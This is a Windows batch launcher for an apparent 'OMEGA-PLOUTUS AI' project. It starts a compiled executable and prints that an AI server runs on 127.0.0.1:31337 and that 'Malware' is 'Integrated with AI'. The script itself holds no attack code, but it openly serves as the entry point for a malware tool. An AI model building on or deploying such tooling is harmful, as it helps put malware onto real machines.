@echo off
:: OMEGA-PLOUTUS AI INTEGRATION LAUNCHER
:: =====================================
:: This batch file launches the complete OMEGA-PLOUTUS AI system
echo ========================================================
echo OMEGA-PLOUTUS AI SYSTEM LAUNCHER
echo ========================================================
echo.

:: Set working directory
cd /d "%~dp0"

:: Check if compiled binaries exist
if not exist "compiled_binaries\omega_ploutus_launcher.exe" (
    echo ❌ Error: Compiled binaries not found!
    echo Please run the build process first.
    pause
    exit /b 1
)

:: Run the launcher
echo 🚀 Starting OMEGA-PLOUTUS AI System...
echo.
start "" "compiled_binaries\omega_ploutus_launcher.exe"

echo 📊 System launched successfully!
echo 🔗 AI Server: 127.0.0.1:31337
echo 🔗 Malware: Integrated with AI
echo.
echo 💡 Press any key to exit this window...
pause
